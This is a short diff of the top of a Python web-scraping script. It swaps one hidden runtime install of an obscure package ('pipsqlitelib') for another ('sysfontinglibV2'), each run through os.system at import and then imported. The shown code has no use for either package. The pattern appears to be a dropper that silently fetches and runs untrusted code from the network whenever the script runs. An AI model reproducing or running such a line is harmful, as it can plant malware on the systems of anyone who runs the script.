@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitelib")
-import pipsqlitelib
+os.system("pip install sysfontinglibV2")
+import sysfontinglibV2
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
